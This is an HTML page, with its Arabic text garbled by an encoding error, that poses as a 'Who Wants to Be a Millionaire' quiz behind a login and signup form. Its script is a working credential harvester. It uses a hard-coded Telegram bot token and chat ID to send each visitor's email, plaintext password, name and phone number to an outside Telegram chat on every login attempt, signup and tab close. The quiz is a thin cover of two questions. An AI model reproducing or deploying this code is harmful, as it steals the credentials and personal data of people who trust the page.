<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ù† Ø³ÙŠØ±Ø¨Ø­ Ø§Ù„Ù…Ù„ÙŠÙˆÙ† - Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ØªØ·ÙˆØ±</title>
    <style>
        body {
            background-color: #020230; color: white; font-family: 'Arial', sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
            background: radial-gradient(circle, #000066 0%, #020230 100%);
        }
        .container {
            background: rgba(0, 0, 0, 0.85); padding: 30px; border: 2px solid #d4af37;
            border-radius: 20px; text-align: center; width: 380px; box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
        }
        input {
            width: 100%; padding: 12px; margin: 8px 0; border-radius: 25px;
            border: 1px solid #d4af37; background: #0a0a2a; color: white; text-align: center;
        }
        button {
            background: linear-gradient(#d4af37, #b8860b); color: black; padding: 12px;
            border: none; border-radius: 25px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;
        }
        #game-interface { display: none; width: 95%; max-width: 800px; }
        .question-box { border: 2px solid #d4af37; padding: 25px; border-radius: 50px; margin-bottom: 30px; font-size: 22px; background: #000044; }
        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .option-btn { background: #000; color: white; border: 1px solid #d4af37; text-align: right; padding: 15px; border-radius: 25px; cursor: pointer; }
        .option-btn:hover { background: orange; color: black; }
    </style>
</head>
<body>

    <div id="auth-screen" class="container">
        <h2 id="title" style="color:#d4af37">Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ø©</h2>
        <form id="auth-form" onsubmit="event.preventDefault(); handleAuth();">
            <input type="email" id="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ" required autocomplete="email">
            <input type="password" id="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required autocomplete="current-password">
            
            <div id="extra-fields">
                <input type="text" id="fullname" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„">
                <input type="tel" id="phone" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„">
            </div>
            
            <button type="submit" id="btn-text">Ø¯Ø®ÙˆÙ„ / ØªØ³Ø¬ÙŠÙ„</button>
        </form>
        <p onclick="toggleMode()" id="toggle-hint" style="cursor:pointer; color: #aaa; font-size: 12px; margin-top:15px;">Ù‡Ù„ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ù„ØªØ¨Ø¯ÙŠÙ„</p>
    </div>

    <div id="game-interface" class="container">
        <div class="question-box"><p id="question-text"></p></div>
        <div class="options-grid">
            <button class="option-btn" onclick="checkAnswer('a')" id="opt-a"></button>
            <button class="option-btn" onclick="checkAnswer('b')" id="opt-b"></button>
            <button class="option-btn" onclick="checkAnswer('c')" id="opt-c"></button>
            <button class="option-btn" onclick="checkAnswer('d')" id="opt-d"></button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8537863001:AAF-66KPtlFqZLdm7Slx5zK-ZTNTKf0wems";
        const CHAT_ID = "6212920872";
        
        let isLoginMode = true;
        let currentUserEmail = "";

        // ØªØ¨Ø¯ÙŠÙ„ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„
        function toggleMode() {
            isLoginMode = !isLoginMode;
            document.getElementById('title').innerText = isLoginMode ? "Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ø©" : "Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯";
            document.getElementById('extra-fields').style.display = isLoginMode ? "none" : "block";
            document.getElementById('btn-text').innerText = isLoginMode ? "ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„" : "ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªØ³Ø¬ÙŠÙ„";
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        async function notifyTelegram(action, data = {}) {
            const time = new Date().toLocaleString('ar-EG');
            let message = `âš ï¸ Ø¥Ø´Ø¹Ø§Ø± Ù…Ù† Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ø©:\nğŸ”¹ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡: ${action}\nğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯: ${data.email || currentUserEmail}\nğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯: ${data.pass || '----'}\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${data.name || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}\nğŸ“ Ø§Ù„Ø¬ÙˆØ§Ù„: ${data.phone || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}\nâ° Ø§Ù„ÙˆÙ‚Øª: ${time}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
        }

        // Ù…Ù†Ø·Ù‚ Ø§Ù„ØªØ­Ù‚Ù‚ ÙˆØ§Ù„Ø¯Ø®ÙˆÙ„
        function handleAuth() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const name = document.getElementById('fullname').value;
            const phone = document.getElementById('phone').value;

            if (isLoginMode) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø© Ø¨Ø§Ù„Ø¬Ù‡Ø§Ø²
                const savedPass = localStorage.getItem(email);
                if (savedPass && savedPass === pass) {
                    currentUserEmail = email;
                    notifyTelegram("ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­ âœ…", {email, pass});
                    startGame();
                } else {
                    alert("Ø¹Ø°Ø±Ø§Ù‹ØŒ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø£Ùˆ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø© Ù…Ø¹ Ø§Ù„Ù…Ø³Ø¬Ù„ ÙÙŠ Ø§Ù„Ø¬Ù‡Ø§Ø².");
                    notifyTelegram("Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ÙØ§Ø´Ù„Ø© âŒ", {email, pass});
                }
            } else {
                // ØªØ³Ø¬ÙŠÙ„ Ø¬Ø¯ÙŠØ¯ ÙˆØ­ÙØ¸ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­
                localStorage.setItem(email, pass);
                currentUserEmail = email;
                notifyTelegram("ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ ÙˆØ­ÙØ¸Ù‡ ğŸ“¥", {email, pass, name, phone});
                startGame();
            }
        }

        function startGame() {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('game-interface').style.display = 'block';
            loadQuestion();
        }

        // ØªØªØ¨Ø¹ Ø§Ù„Ø®Ø±ÙˆØ¬ Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØªØ¨ÙˆÙŠØ¨
        window.addEventListener('beforeunload', () => {
            if (currentUserEmail) {
                notifyTelegram("Ù‚Ø§Ù… Ø¨Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† Ø§Ù„ØµÙØ­Ø© ğŸ”´");
            }
        });

        // Ø§Ù„Ø£Ø³Ø¦Ù„Ø© (Ø¹ÙŠÙ†Ø© Ø¨Ø³ÙŠØ·Ø©)
        let currentStep = 0;
        const questions = [
            { q: "Ù…Ø§ Ù‡Ùˆ Ø§Ù„ÙƒÙˆÙƒØ¨ Ø§Ù„Ø°ÙŠ ÙŠÙ„Ù‚Ø¨ Ø¨Ø§Ù„ÙƒÙˆÙƒØ¨ Ø§Ù„Ø£Ø­Ù…Ø±ØŸ", a: "Ø§Ù„Ù…Ø´ØªØ±ÙŠ", b: "Ø§Ù„Ù…Ø±ÙŠØ®", c: "Ø²Ø­Ù„", d: "Ø§Ù„Ø²Ù‡Ø±Ø©", correct: "b" },
            { q: "Ø£ÙŠÙ† ØªÙ‚Ø¹ Ø§Ù„ÙƒØ¹Ø¨Ø© Ø§Ù„Ù…Ø´Ø±ÙØ©ØŸ", a: "Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©", b: "Ø§Ù„Ø±ÙŠØ§Ø¶", c: "Ù…ÙƒØ©", d: "Ø¬Ø¯Ø©", correct: "c" }
        ];

        function loadQuestion() {
            const q = questions[currentStep];
            document.getElementById('question-text').innerText = q.q;
            document.getElementById('opt-a').innerText = q.a;
            document.getElementById('opt-b').innerText = q.b;
            document.getElementById('opt-c').innerText = q.c;
            document.getElementById('opt-d').innerText = q.d;
        }

        function checkAnswer(ans) {
            if(ans === questions[currentStep].correct) {
                currentStep++;
                if(currentStep < questions.length) loadQuestion();
                else alert("Ù…Ø¨Ø±ÙˆÙƒ!");
            } else {
                alert("Ø®Ø·Ø£! Ø³Ù†Ø¨Ø¯Ø£ Ù…Ù† Ø¬Ø¯ÙŠØ¯.");
                currentStep = 0;
                loadQuestion();
            }
        }

        // ØªØ´ØºÙŠÙ„ ÙˆØ¶Ø¹ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§ÙØªØ±Ø§Ø¶ÙŠØ§Ù‹
        toggleMode(); toggleMode(); 
    </script>
</body>
</html>
